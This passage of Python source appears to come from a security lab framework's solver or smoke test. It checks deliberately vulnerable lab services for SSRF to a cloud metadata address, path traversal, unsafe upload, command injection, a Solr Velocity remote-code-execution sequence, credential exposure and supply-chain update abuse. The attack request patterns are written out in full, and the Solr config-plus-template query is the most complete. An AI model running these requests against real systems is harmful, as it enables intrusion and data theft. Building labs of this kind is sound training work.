        detail_status, detail, _, detail_route = http_json_first(
            "GET",
            base_url,
            [f"/api/source-registry/{source_id}", f"/labforge/scaffold/source-registry/{source_id}"],
            None,
            timeout_seconds,
        )
        plan_status, plan, _, plan_route = http_json_first(
            "GET",
            base_url,
            [f"/api/source-registry/{source_id}/validation-plan"],
            None,
            timeout_seconds,
        )
        plan_data = plan.get("plan", {}) if isinstance(plan, dict) else {}
        policy_status, policy, _, policy_route = http_json_first(
            "GET",
            base_url,
            ["/api/fetch/policy", "/labforge/scaffold/fetch/policy"],
            None,
            timeout_seconds,
        )
        blocked_status, blocked_data, _, blocked_route = http_json_first(
            "GET",
            base_url,
            ["/operations/fetch?url=http://169.254.169.254/latest", "/labforge/scaffold/fetch?url=http://169.254.169.254/latest"],
            None,
            timeout_seconds,
        )
        allowed_status, allowed_data, allowed_body, allowed_route = http_json_first(
            "GET",
            base_url,
            [
                f"/operations/fetch?url={quote(approved_source, safe=':/')}",
                f"/labforge/scaffold/fetch?url={quote(approved_source, safe=':/')}",
            ],
            None,
            timeout_seconds,
        )
        audit_status, audit, _, audit_route = http_json_first(
            "GET",
            base_url,
            ["/api/fetch/audit", "/labforge/scaffold/fetch/audit"],
            None,
            timeout_seconds,
        )
        audit_records = audit.get("records", []) if isinstance(audit, dict) else []
        allowed_provenance = allowed_data.get("provenance", {}) if isinstance(allowed_data, dict) else {}
        blocked_provenance = blocked_data.get("provenance", {}) if isinstance(blocked_data, dict) else {}
        blocked_recorded = any(
            isinstance(record, dict)
            and record.get("url") == "http://169.254.169.254/latest"
            and record.get("allowed") is False
            and record.get("provenance", {}).get("policy_decision") == "deny"
            for record in audit_records
        )
        allowed_recorded = any(
            isinstance(record, dict)
            and record.get("url") == approved_source
            and record.get("allowed") is True
            and record.get("provenance", {}).get("registry_match") is True
            and bool(record.get("response_fingerprint"))
            for record in audit_records
        )
        ok = (
            landing_ok
            and registry_status == 200
            and jobs_status == 200
            and job_links_source
            and detail_status == 200
            and plan_status == 200
            and plan_data.get("expected_policy_result") == "allow"
            and bool(plan_data.get("manual_validation_url"))
            and policy_status == 200
            and isinstance(sources, list)
            and len(sources) >= 1
            and blocked_status == 400
            and blocked_data.get("allowed") is False
            and blocked_provenance.get("policy_decision") == "deny"
            and allowed_status == 200
            and allowed_data.get("allowed") is True
            and allowed_provenance.get("registry_match") is True
            and allowed_provenance.get("source_id") == source_id
            and bool(allowed_data.get("response_fingerprint"))
            and audit_status == 200
            and blocked_recorded
            and allowed_recorded
            and approved_source.split("//", 1)[-1].split("/", 1)[0].split(":", 1)[0] in (json.dumps(allowed_data) + allowed_body)
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; registry_route={registry_route}; detail_route={detail_route}; jobs_route={jobs_route}; plan_route={plan_route}; "
                f"policy_route={policy_route}; blocked_route={blocked_route}; allowed_route={allowed_route}; audit_route={audit_route}; "
                f"registry={registry_status}; jobs={jobs_status}; job_links_source={job_links_source}; detail={detail_status}; "
                f"plan={plan_status}; expected_policy={plan_data.get('expected_policy_result')}; policy={policy_status}; "
                f"approved_source={approved_source}; source_id={source_id}; "
                f"blocked_fetch_status={blocked_status}; blocked_allowed={blocked_data.get('allowed')}; "
                f"allowed_fetch_status={allowed_status}; allowed={allowed_data.get('allowed')}; audit={audit_status}; "
                f"blocked_recorded={blocked_recorded}; allowed_recorded={allowed_recorded}; "
                f"allowed_provenance={allowed_provenance.get('policy_decision')}/{allowed_provenance.get('source_id')}"
            ),
        )
    if plugin == "path-traversal-download":
        catalog_status, catalog, _, catalog_route = http_json_first(
            "GET",
            base_url,
            ["/api/documents", "/labforge/scaffold/documents"],
            None,
            timeout_seconds,
        )
        policy_status, policy, _, policy_route = http_json_first(
            "GET",
            base_url,
            ["/api/documents/policy", "/labforge/scaffold/documents/policy"],
            None,
            timeout_seconds,
        )
        archive_status, archive_routes, _, archive_route = http_json_first(
            "GET",
            base_url,
            ["/api/documents/archive-routes", "/labforge/scaffold/documents/archive-routes"],
            None,
            timeout_seconds,
        )
        resolve_status, resolution, _, resolve_route = http_json_first(
            "GET",
            base_url,
            [
                "/api/documents/resolve?name=../restricted/audit-export.txt",
                "/labforge/scaffold/documents/resolve?name=../restricted/audit-export.txt",
            ],
            None,
            timeout_seconds,
        )
        public_status, _, _, public_route = http_json_first(
            "GET",
            base_url,
            ["/documents/download?name=welcome.txt", "/labforge/scaffold/documents/download?name=welcome.txt"],
            None,
            timeout_seconds,
        )
        traversed_status, _, traversed_body, traversed_route = http_json_first(
            "GET",
            base_url,
            ["/documents/download?name=../restricted/audit-export.txt", "/labforge/scaffold/documents/download?name=../restricted/audit-export.txt"],
            None,
            timeout_seconds,
        )
        audit_status, audit, _, audit_route = http_json_first(
            "GET",
            base_url,
            ["/api/documents/audit", "/labforge/scaffold/documents/audit"],
            None,
            timeout_seconds,
        )
        audit_records = audit.get("records", []) if isinstance(audit, dict) else []
        resolved = resolution.get("resolution", {}) if isinstance(resolution, dict) else {}
        archive_route_ids = [
            route.get("id")
            for route in archive_routes.get("routes", [])
            if isinstance(route, dict)
        ] if isinstance(archive_routes, dict) else []
        traversal_recorded = any(
            isinstance(record, dict)
            and record.get("traversal")
            and record.get("status") == 200
            and record.get("provenance", {}).get("archive_route_match") == "archive-route-restricted-records"
            for record in audit_records
        )
        ok = (
            landing_ok
            and catalog_status == 200
            and policy_status == 200
            and archive_status == 200
            and "archive-route-restricted-records" in archive_route_ids
            and resolve_status == 200
            and resolved.get("traversal") is True
            and resolved.get("inside_document_root") is True
            and resolved.get("inside_active_workspace") is False
            and resolved.get("archive_route_match") == "archive-route-restricted-records"
            and public_status == 200
            and traversed_status == 200
            and audit_status == 200
            and "LABFORGE_SYNTHETIC_RESTRICTED_DOCUMENT" in traversed_body
            and traversal_recorded
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; catalog_route={catalog_route}; policy_route={policy_route}; archive_route={archive_route}; resolve_route={resolve_route}; "
                f"public_route={public_route}; traversed_route={traversed_route}; audit_route={audit_route}; "
                f"catalog={catalog_status}; policy={policy_status}; archive={archive_status}; resolve={resolve_status}; normalized={resolved.get('normalized', '-')}; "
                f"archive_match={resolved.get('archive_route_match')}; public={public_status}; traversed={traversed_status}; audit={audit_status}; "
                f"traversal_recorded={traversal_recorded}"
            ),
        )
    if plugin == "unsafe-file-upload":
        policy_status, policy, _, policy_route = http_json_first(
            "GET",
            base_url,
            ["/api/attachments/policy", "/labforge/scaffold/uploads/policy"],
            None,
            timeout_seconds,
        )
        uploaded_status, uploaded, _ = http_multipart_upload(
            f"{base_url}/attachments",
            field_name="file",
            filename="case-note.bin",
            content=b"labforge upload smoke",
            timeout_seconds=timeout_seconds,
        )
        upload_route = "/attachments"
        if uploaded_status == 404:
            uploaded_status, uploaded, _ = http_multipart_upload(
                f"{base_url}/labforge/scaffold/uploads",
                field_name="file",
                filename="case-note.bin",
                content=b"labforge upload smoke",
                timeout_seconds=timeout_seconds,
            )
            upload_route = "/labforge/scaffold/uploads"
        filename = str(uploaded.get("filename", ""))
        review_workbench_status, _, review_workbench_body, review_workbench_route = http_json_first(
            "GET",
            base_url,
            ["/attachments/review", "/labforge/scaffold/uploads/review-workbench"],
            None,
            timeout_seconds,
        )
        review_decision_status, review_decision, _, review_decision_route = (
            http_json_first(
                "POST",
                base_url,
                [f"/api/attachments/review/{filename}/decision", f"/labforge/scaffold/uploads/review/{filename}/decision"],
                {"decision": "quarantine"},
                timeout_seconds,
            )
            if filename
            else (0, {}, "", "")
        )
        retrieved_status, _, retrieved_body, retrieve_route = (
            http_json_first("GET", base_url, [f"/attachments/{filename}", f"/labforge/scaffold/uploads/{filename}"], None, timeout_seconds)
            if filename
            else (0, {}, "", "")
        )
        review_status, review, _, review_route = http_json_first(
            "GET",
            base_url,
            ["/api/attachments/review", "/labforge/scaffold/uploads/review"],
            None,
            timeout_seconds,
        )
        storage_status, storage, _, storage_route = http_json_first(
            "GET",
            base_url,
            ["/api/attachments/storage", "/labforge/scaffold/uploads/storage"],
            None,
            timeout_seconds,
        )
        storage_object_status, storage_object, _, storage_object_route = http_json_first(
            "GET",
            base_url,
            [f"/api/attachments/storage/{filename}", f"/labforge/scaffold/uploads/storage/{filename}"],
            None,
            timeout_seconds,
        )
        access_status, access, _, access_route = http_json_first(
            "GET",
            base_url,
            ["/api/attachments/access-audit", "/labforge/scaffold/uploads/access-audit"],
            None,
            timeout_seconds,
        )
        records = review.get("records", []) if isinstance(review, dict) else []
        storage_objects = storage.get("objects", []) if isinstance(storage, dict) else []
        storage_object_data = storage_object.get("object", {}) if isinstance(storage_object, dict) else {}
        access_records = access.get("records", []) if isinstance(access, dict) else []
        review_recorded = any(isinstance(record, dict) and record.get("filename") == filename and record.get("decision", {}).get("storage_object_id") for record in records)
        policy_mismatch_recorded = any(isinstance(record, dict) and record.get("filename") == filename and record.get("policy_match") is False and record.get("decision", {}).get("allowed_by_runtime") is True for record in records)
        quarantine_recorded = any(isinstance(record, dict) and record.get("filename") == filename and record.get("status") == "quarantined_by_review" and record.get("decision", {}).get("runtime_enforcement_gap") is True for record in records)
        storage_recorded = any(isinstance(item, dict) and item.get("filename") == filename and item.get("retrieval_url") == f"/attachments/{filename}" and item.get("detail_api") == f"/api/attachments/storage/{filename}" for item in storage_objects)
        storage_detail_ok = (
            storage_object_status == 200
            and storage_object_data.get("filename") == filename
            and storage_object_data.get("decision", {}).get("policy_match") is False
            and storage_object_data.get("review_status") == "quarantined_by_review"
        )
        upload_audited = any(isinstance(record, dict) and record.get("action") == "upload" and record.get("filename") == filename and record.get("status") == 201 and record.get("provenance", {}).get("storage_object_api") == f"/api/attachments/storage/{filename}" for record in access_records)
        quarantine_audited = any(isinstance(record, dict) and record.get("action") == "review-quarantine" and record.get("filename") == filename and record.get("status") == 202 for record in access_records)
        retrieve_audited = any(isinstance(record, dict) and record.get("action") == "retrieve" and record.get("filename") == filename and record.get("status") == 200 and record.get("provenance", {}).get("retrieval_url") == f"/attachments/{filename}" for record in access_records)
        ok = (
            landing_ok
            and policy_status == 200
            and uploaded_status == 201
            and review_workbench_status == 200
            and "Attachment Review Workbench" in review_workbench_body
            and review_decision_status == 202
            and review_decision.get("runtime_enforcement_gap") is True
            and retrieved_status == 200
            and review_status == 200
            and storage_status == 200
            and storage_detail_ok
            and access_status == 200
            and "labforge upload smoke" in retrieved_body
            and review_recorded
            and policy_mismatch_recorded
            and quarantine_recorded
            and storage_recorded
            and upload_audited
            and quarantine_audited
            and retrieve_audited
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; policy_route={policy_route}; upload_route={upload_route}; "
                f"review_workbench_route={review_workbench_route}; review_decision_route={review_decision_route}; retrieve_route={retrieve_route}; "
                f"review_route={review_route}; storage_route={storage_route}; storage_object_route={storage_object_route}; access_route={access_route}; policy={policy_status}; "
                f"uploaded={uploaded_status}; review_workbench={review_workbench_status}; review_decision={review_decision_status}; retrieved={retrieved_status}; "
                f"review={review_status}; storage={storage_status}; storage_object={storage_object_status}; access={access_status}; "
                f"filename={filename or '-'}; review_recorded={review_recorded}; policy_mismatch_recorded={policy_mismatch_recorded}; "
                f"quarantine_recorded={quarantine_recorded}; storage_recorded={storage_recorded}; upload_audited={upload_audited}; "
                f"quarantine_audited={quarantine_audited}; retrieve_audited={retrieve_audited}"
            ),
        )
    if plugin == "diagnostic-command-injection":
        info_status, info, _, info_route = http_json_first(
            "GET",
            base_url,
            ["/api/diagnostics", "/labforge/scaffold/diagnostics"],
            None,
            timeout_seconds,
        )
        policy_status, policy, _, policy_route = http_json_first(
            "GET",
            base_url,
            ["/api/diagnostics/policy", "/labforge/scaffold/diagnostics/policy"],
            None,
            timeout_seconds,
        )
        targets = info.get("targets", []) if isinstance(info, dict) else []
        target_name = "localhost"
        if targets and isinstance(targets[0], dict) and targets[0].get("name"):
            target_name = str(targets[0]["name"])
        target_status, target_detail, _, target_route = http_json_first(
            "GET",
            base_url,
            [f"/api/diagnostics/targets/{target_name}", f"/labforge/scaffold/diagnostics/targets/{target_name}"],
            None,
            timeout_seconds,
        )
        status, data, _, route = http_json_first(
            "POST",
            base_url,
            ["/operations/diagnostics/run", "/labforge/scaffold/diagnostics/run"],
            {"preset": "runtime-identity", "target": "localhost"},
            timeout_seconds,
        )
        blocked_status, blocked_data, _, blocked_route = http_json_first(
            "POST",
            base_url,
            ["/operations/diagnostics/run", "/labforge/scaffold/diagnostics/run"],
            {"command": "docker ps", "target": "localhost"},
            timeout_seconds,
        )
        audit_status, audit, _, audit_route = http_json_first(
            "GET",
            base_url,
            ["/api/diagnostics/audit", "/labforge/scaffold/diagnostics/audit"],
            None,
            timeout_seconds,
        )
        audit_records = audit.get("records", []) if isinstance(audit, dict) else []
        accepted_decision = data.get("policy_decision", {}) if isinstance(data, dict) else {}
        blocked_decision = blocked_data.get("policy_decision", {}) if isinstance(blocked_data, dict) else {}
        accepted_recorded = any(
            isinstance(record, dict)
            and record.get("preset") == "runtime-identity"
            and record.get("accepted") is True
            and record.get("policy_decision", {}).get("decision") == "allow"
            and bool(record.get("output_fingerprint"))
            for record in audit_records
        )
        blocked_recorded = any(
            isinstance(record, dict)
            and record.get("accepted") is False
            and record.get("blocked_token_matched") is True
            and record.get("policy_decision", {}).get("decision") == "deny"
            for record in audit_records
        )
        ok = (
            landing_ok
            and info_status == 200
            and isinstance(info.get("presets"), list)
            and isinstance(info.get("targets"), list)
            and policy_status == 200
            and "docker" in policy.get("blocked_tokens", [])
            and target_status == 200
            and status == 200
            and data.get("accepted") is True
            and accepted_decision.get("decision") == "allow"
            and bool(data.get("output_fingerprint"))
            and blocked_status == 400
            and blocked_data.get("accepted") is False
            and blocked_decision.get("decision") == "deny"
            and audit_status == 200
            and accepted_recorded
            and blocked_recorded
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; info_route={info_route}; policy_route={policy_route}; target_route={target_route}; route={route}; "
                f"blocked_route={blocked_route}; audit_route={audit_route}; info={info_status}; policy={policy_status}; "
                f"target={target_status}/{target_name}; "
                f"presets={len(info.get('presets', [])) if isinstance(info, dict) else 0}; "
                f"targets={len(info.get('targets', [])) if isinstance(info, dict) else 0}; "
                f"http_status={status}; accepted={data.get('accepted')}; blocked={blocked_status}; "
                f"blocked_accepted={blocked_data.get('accepted')}; audit={audit_status}; audit_records={len(audit_records)}; "
                f"accepted_recorded={accepted_recorded}; blocked_recorded={blocked_recorded}; "
                f"accepted_decision={accepted_decision.get('decision')}; blocked_decision={blocked_decision.get('decision')}"
            ),
        )
    if plugin == "solr-velocity-rce":
        cores_status, cores, _, cores_route = http_json_first(
            "GET",
            base_url,
            ["/api/search/cores", "/labforge/scaffold/solr/cores"],
            None,
            timeout_seconds,
        )
        policy_status, policy, _, policy_route = http_json_first(
            "GET",
            base_url,
            ["/api/search/policy", "/labforge/scaffold/solr/policy"],
            None,
            timeout_seconds,
        )
        drift_before_status, drift_before, _, drift_before_route = http_json_first(
            "GET",
            base_url,
            ["/api/search/config-drift", "/labforge/scaffold/solr/config-drift"],
            None,
            timeout_seconds,
        )
        system_status, _, _, system_route = http_json_first(
            "GET",
            base_url,
            ["/solr/ops-core/admin/info/system", "/solr/admin/info/system", "/labforge/scaffold/solr/admin/info/system"],
            None,
            timeout_seconds,
        )
        config_status, _, _, config_route = http_json_first(
            "POST",
            base_url,
            ["/solr/ops-core/config", "/labforge/scaffold/solr/config"],
            {
                "update-queryresponsewriter": {
                    "name": "velocity",
                    "class": "solr.VelocityResponseWriter",
                    "params.resource.loader.enabled": "true",
                }
            },
            timeout_seconds,
        )
        select_status, _, select_body, select_route = http_json_first(
            "GET",
            base_url,
            [
                "/solr/ops-core/select?q=*:*&wt=velocity&v.template=custom&v.template.custom=labforge_cmd%3Did",
                "/labforge/scaffold/solr/select?q=*:*&wt=velocity&v.template=custom&v.template.custom=labforge_cmd%3Did",
            ],
            None,
            timeout_seconds,
        )
        drift_after_status, drift_after, _, drift_after_route = http_json_first(
            "GET",
            base_url,
            ["/api/search/config-drift", "/labforge/scaffold/solr/config-drift"],
            None,
            timeout_seconds,
        )
        audit_status, audit, _, audit_route = http_json_first(
            "GET",
            base_url,
            ["/api/search/audit", "/labforge/scaffold/solr/audit"],
            None,
            timeout_seconds,
        )
        core_items = cores.get("cores", []) if isinstance(cores, dict) else []
        audit_records = audit.get("records", []) if isinstance(audit, dict) else []
        config_recorded = any(
            isinstance(item, dict) and item.get("action") == "response-writer-config-change" and item.get("accepted") is True
            for item in audit_records
        )
        execution_recorded = any(
            isinstance(item, dict) and item.get("action") == "template-query-executed" and item.get("accepted") is True
            for item in audit_records
        )
        ok = (
            landing_ok
            and cores_status == 200
            and any(isinstance(item, dict) and item.get("legacy") is True for item in core_items)
            and policy_status == 200
            and policy.get("audit_api") == "/api/search/audit"
            and drift_before_status == 200
            and drift_before.get("legacy_track") is True
            and system_status == 200
            and config_status == 200
            and select_status == 200
            and drift_after_status == 200
            and drift_after.get("velocity_response_writer") is True
            and audit_status == 200
            and config_recorded
            and execution_recorded
            and "uid=8983(solr)" in select_body
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; cores_route={cores_route}; policy_route={policy_route}; drift_before_route={drift_before_route}; "
                f"system_route={system_route}; config_route={config_route}; select_route={select_route}; drift_after_route={drift_after_route}; audit_route={audit_route}; "
                f"cores={cores_status}; legacy_cores={sum(1 for item in core_items if isinstance(item, dict) and item.get('legacy') is True)}; "
                f"policy={policy_status}; drift_before={drift_before_status}; system={system_status}; config={config_status}; select={select_status}; "
                f"drift_after={drift_after_status}; velocity_response_writer={drift_after.get('velocity_response_writer')}; "
                f"audit={audit_status}; config_recorded={config_recorded}; execution_recorded={execution_recorded}"
            ),
        )
    if plugin == "credential-exposure":
        config_status, config, _, config_route = http_json_first(
            "GET",
            base_url,
            ["/api/config", "/labforge/scaffold/config"],
            None,
            timeout_seconds,
        )
        policy_status, policy, _, policy_route = http_json_first(
            "GET",
            base_url,
            ["/api/config/secret-policy", "/labforge/scaffold/config/secret-policy"],
            None,
            timeout_seconds,
        )
        profile_status, profile, _, profile_route = http_json_first(
            "GET",
            base_url,
            ["/api/config/bind-profile", "/labforge/scaffold/config/bind-profile"],
            None,
            timeout_seconds,
        )
        log_status, _, log_body, log_route = http_json_first(
            "GET",
            base_url,
            ["/api/config/startup-log", "/labforge/scaffold/config/startup-log"],
            None,
            timeout_seconds,
        )
        correlation_status, correlation, _, correlation_route = http_json_first(
            "GET",
            base_url,
            ["/api/config/correlation", "/labforge/scaffold/config/correlation"],
            None,
            timeout_seconds,
        )
        audit_status, audit, _, audit_route = http_json_first(
            "GET",
            base_url,
            ["/api/config/access-audit", "/labforge/scaffold/config/access-audit"],
            None,
            timeout_seconds,
        )
        audit_records = audit.get("records", []) if isinstance(audit, dict) else []
        profile_data = profile.get("profile", {}) if isinstance(profile, dict) else {}
        evidence_chain = correlation.get("evidence_chain", []) if isinstance(correlation, dict) else []
        redacted_config_audited = any(
            isinstance(record, dict)
            and record.get("action") == "config-read"
            and record.get("secret_value_visible") is False
            and record.get("provenance", {}).get("secret_value_source") == "runtime-config-redaction"
            for record in audit_records
        )
        startup_secret_audited = any(
            isinstance(record, dict)
            and record.get("action") == "startup-log-read"
            and record.get("secret_value_visible") is True
            and record.get("provenance", {}).get("secret_value_source") == "startup-cache-export"
            for record in audit_records
        )
        ok = (
            landing_ok
            and config_status == 200
            and policy_status == 200
            and profile_status == 200
            and log_status == 200
            and correlation_status == 200
            and audit_status == 200
            and config.get("secret_value") == "redacted"
            and config.get("bind_profile_api") == "/api/config/bind-profile"
            and "redacted" in policy.get("redaction_policy", "")
            and policy.get("bind_profile_api") == "/api/config/bind-profile"
            and profile_data.get("secret_reference") == config.get("secret_reference")
            and correlation.get("secret_reference") == config.get("secret_reference")
            and correlation.get("cache_profile_matches_account") is True
            and isinstance(evidence_chain, list)
            and len(evidence_chain) >= 3
            and bool(correlation.get("recovered_credential"))
            and "vault-cache export" in log_body
            and redacted_config_audited
            and startup_secret_audited
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; config_route={config_route}; policy_route={policy_route}; profile_route={profile_route}; log_route={log_route}; "
                f"correlation_route={correlation_route}; audit_route={audit_route}; config={config_status}; "
                f"policy={policy_status}; profile={profile_status}; log={log_status}; correlation={correlation_status}; audit={audit_status}; "
                f"secret_value={config.get('secret_value', '-')}; profile_reference_match={profile_data.get('secret_reference') == config.get('secret_reference')}; "
                f"cache_profile_matches_account={correlation.get('cache_profile_matches_account')}; evidence_chain={len(evidence_chain) if isinstance(evidence_chain, list) else 'unknown'}; "
                f"recovered_credential={'present' if correlation.get('recovered_credential') else 'missing'}; "
                f"redacted_config_audited={redacted_config_audited}; startup_secret_audited={startup_secret_audited}"
            ),
        )
    if plugin == "build-pipeline-abuse":
        context_status, context, _, context_route = http_json_first(
            "GET",
            base_url,
            ["/api/build/context", "/labforge/scaffold/build/context"],
            None,
            timeout_seconds,
        )
        metadata_status, metadata, _, metadata_route = http_json_first(
            "GET",
            base_url,
            ["/api/build/release-metadata", "/labforge/scaffold/build/release-metadata"],
            None,
            timeout_seconds,
        )
        patch_field = str(context.get("patch_ref_field") or metadata.get("required_patch_field") or "support_patch_ref")
        payload = {
            "repo": metadata.get("repo") or context.get("repo") or "smoke/product-agent",
            "ref": metadata.get("ref") or context.get("ref") or "refs/heads/release/smoke",
            "channel": metadata.get("channel") or context.get("channel") or "smoke",
            patch_field: "lab://smoke.patch",
        }
        policy_status, policy, _, policy_route = http_json_first(
            "POST",
            base_url,
            ["/api/build/policy", "/labforge/scaffold/build/policy"],
            payload,
            timeout_seconds,
        )
        status, data, _, route = http_json_first(
            "POST",
            base_url,
            ["/api/build/jobs", "/labforge/scaffold/build/jobs"],
            payload,
            timeout_seconds,
        )
        job_id = str(data.get("job_id") or "")
        provenance_status, provenance, _, provenance_route = http_json_first(
            "GET",
            base_url,
            [f"/api/build/jobs/{job_id}/provenance", f"/labforge/scaffold/build/jobs/{job_id}/provenance"] if job_id else [],
            None,
            timeout_seconds,
        )
        audit_status, audit, _, audit_route = http_json_first(
            "GET",
            base_url,
            ["/api/build/audit", "/labforge/scaffold/build/audit"],
            None,
            timeout_seconds,
        )
        manifest = data.get("canonical_manifest", {}) if isinstance(data, dict) else {}
        artifact = manifest.get("artifact", {}) if isinstance(manifest, dict) else {}
        provenance_payload = provenance.get("provenance", {}) if isinstance(provenance, dict) else {}
        audit_records = audit.get("records", []) if isinstance(audit, dict) else []
        policy_recorded = any(isinstance(item, dict) and item.get("action") == "policy-check" and item.get("accepted") is True for item in audit_records)
        job_recorded = any(isinstance(item, dict) and item.get("action") == "job-create" and item.get("accepted") is True for item in audit_records)
        ok = (
            landing_ok
            and context_status == 200
            and metadata_status == 200
            and policy_status == 200
            and policy.get("allowed") is True
            and status == 201
            and data.get("status") == "built"
            and "canonical_manifest" in data
            and all(key in artifact for key in ("name", "sha256", "url", "size_bytes"))
            and provenance_status == 200
            and provenance_payload.get("artifact_sha256") == artifact.get("sha256")
            and audit_status == 200
            and policy_recorded
            and job_recorded
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; context_route={context_route}; metadata_route={metadata_route}; policy_route={policy_route}; route={route}; "
                f"provenance_route={provenance_route}; audit_route={audit_route}; "
                f"context={context_status}; metadata={metadata_status}; policy={policy_status}; policy_allowed={policy.get('allowed')}; "
                f"http_status={status}; job_id={data.get('job_id', '-')}; artifact_fields={len(artifact)}; "
                f"provenance={provenance_status}; audit={audit_status}; policy_recorded={policy_recorded}; job_recorded={job_recorded}"
            ),
        )
    if plugin == "signed-update-publish":
        manifest = {
            "product": "product-agent",
            "channel": "smoke",
            "version": "0.0.0",
            "build_id": "build-smoke",
            "artifact": {"name": "smoke.tar", "sha256": "0" * 64, "url": "http://build-server/smoke.tar", "size_bytes": 1},
        }
        policy_status, policy, _, policy_route = http_json_first("GET", base_url, ["/api/signing/policy", "/labforge/scaffold/signing/policy"], None, timeout_seconds)
        validation_status, validation, _, validation_route = http_json_first("POST", base_url, ["/api/sign/validate", "/labforge/scaffold/sign/validate"], {}, timeout_seconds)
        if validation_status == 400:
            validation_status, validation, _, validation_route = http_json_first("POST", base_url, ["/api/sign/validate", "/labforge/scaffold/sign/validate"], {"canonical_manifest": manifest}, timeout_seconds)
        signed_status, signed, _, sign_route = http_json_first("POST", base_url, ["/api/sign", "/labforge/scaffold/sign"], {}, timeout_seconds)
        if signed_status == 400:
            signed_status, signed, _, sign_route = http_json_first("POST", base_url, ["/api/sign", "/labforge/scaffold/sign"], {"canonical_manifest": manifest}, timeout_seconds)
        sign_audit_status, sign_audit, _, sign_audit_route = http_json_first("GET", base_url, ["/api/sign/audit", "/labforge/scaffold/sign/audit"], None, timeout_seconds)
        inventory_status, inventory, _, inventory_route = http_json_first("GET", base_url, ["/api/signed-manifests", "/labforge/scaffold/signed-manifests"], None, timeout_seconds)
        publish_status, published, _, publish_route = http_json_first("POST", base_url, ["/api/publish", "/labforge/scaffold/publish"], {}, timeout_seconds)
        if publish_status == 400:
            publish_status, published, _, publish_route = http_json_first("POST", base_url, ["/api/publish", "/labforge/scaffold/publish"], {"channel": "smoke", "signed_manifest": signed.get("signed_manifest")}, timeout_seconds)
        audit_status, audit, _, audit_route = http_json_first("GET", base_url, ["/api/publish/audit", "/labforge/scaffold/publish/audit"], None, timeout_seconds)
        channel_status, channel_state, _, channel_route = http_json_first("GET", base_url, ["/api/channels/smoke", "/labforge/scaffold/channels/smoke"], None, timeout_seconds)
        sign_records = sign_audit.get("records", []) if isinstance(sign_audit, dict) else []
        validation_recorded = any(isinstance(item, dict) and item.get("action") == "manifest-validate" and item.get("accepted") is True for item in sign_records)
        sign_recorded = any(isinstance(item, dict) and item.get("action") == "manifest-sign" and item.get("accepted") is True for item in sign_records)
        ok = (
            landing_ok
            and policy_status == 200
            and validation_status == 200
            and validation.get("allowed") is True
            and signed_status == 200
            and sign_audit_status == 200
            and validation_recorded
            and sign_recorded
            and inventory_status == 200
            and inventory.get("count", 0) >= 1
            and publish_status == 201
            and audit_status == 200
            and audit.get("count", 0) >= 1
            and channel_status == 200
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; policy_route={policy_route}; validation_route={validation_route}; sign_route={sign_route}; "
                f"sign_audit_route={sign_audit_route}; inventory_route={inventory_route}; publish_route={publish_route}; audit_route={audit_route}; channel_route={channel_route}; "
                f"policy={policy_status}; validation={validation_status}; validation_allowed={validation.get('allowed')}; "
                f"signed={signed_status}; sign_audit={sign_audit_status}; validation_recorded={validation_recorded}; sign_recorded={sign_recorded}; "
                f"signed_inventory={inventory_status}; signed_count={inventory.get('count', 0)}; published={publish_status}; audit={audit_status}; audit_records={audit.get('count', 0)}; "
                f"channel={channel_status}; signed_source={signed.get('source', '-')}; build_id={published.get('manifest', {}).get('build_id', channel_state.get('manifest', {}).get('build_id', '-'))}"
            ),
        )
    if plugin == "customer-update-callback":
        policy_status, policy, _, policy_route = http_json_first("GET", base_url, ["/api/customer/update-policy", "/labforge/scaffold/customer/update-policy"], None, timeout_seconds)
        pre_status, _, _, pre_route = http_json_first("GET", base_url, ["/api/customer/export", "/labforge/scaffold/customer/export"], None, timeout_seconds)
        manifest = {
            "product": "product-agent",
            "channel": "smoke",
            "build_id": "build-smoke",
            "artifact": {"name": "product-agent-smoke.tar", "sha256": "0" * 64, "url": "http://update/product-agent-smoke.tar"},
            "signature": "smoke",
        }
        poll_status, poll, _, poll_route = http_json_first("POST", base_url, ["/api/customer/poll", "/labforge/scaffold/customer/poll"], {"channel": "smoke"}, timeout_seconds)
        if poll_status == 400:
            poll_status, poll, _, poll_route = http_json_first("POST", base_url, ["/api/customer/poll", "/labforge/scaffold/customer/poll"], {"manifest": manifest}, timeout_seconds)
        export_status, export, _, export_route = http_json_first("GET", base_url, ["/api/customer/export", "/labforge/scaffold/customer/export"], None, timeout_seconds)
        audit_status, audit, _, audit_route = http_json_first("GET", base_url, ["/api/customer/audit", "/labforge/scaffold/customer/audit"], None, timeout_seconds)
        records = audit.get("records", []) if isinstance(audit, dict) else []
        poll_recorded = any(isinstance(item, dict) and item.get("action") == "poll" and item.get("accepted") is True for item in records)
        apply_recorded = any(isinstance(item, dict) and item.get("action") == "update-applied" and item.get("accepted") is True for item in records)
        export_recorded = any(isinstance(item, dict) and item.get("action") == "export-read" and item.get("accepted") is True for item in records)
        ok = (
            landing_ok
            and policy_status == 200
            and policy.get("audit_api") == "GET /api/customer/audit"
            and pre_status == 403
            and poll_status == 202
            and export_status == 200
            and export.get("content") == "LABFORGE_SUPPLY_CHAIN_FINAL_OBJECT"
            and audit_status == 200
            and poll_recorded
            and apply_recorded
            and export_recorded
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; policy_route={policy_route}; pre_route={pre_route}; poll_route={poll_route}; export_route={export_route}; audit_route={audit_route}; "
                f"policy={policy_status}; pre={pre_status}; poll={poll_status}; export={export_status}; audit={audit_status}; "
                f"poll_recorded={poll_recorded}; apply_recorded={apply_recorded}; export_recorded={export_recorded}; build_id={poll.get('build_id', '-')}"
            ),
        )
    return SolverRunStep(
        order=order,
        step_id=step_id,
        action_type="vulnerability-behavior",
        service=service,
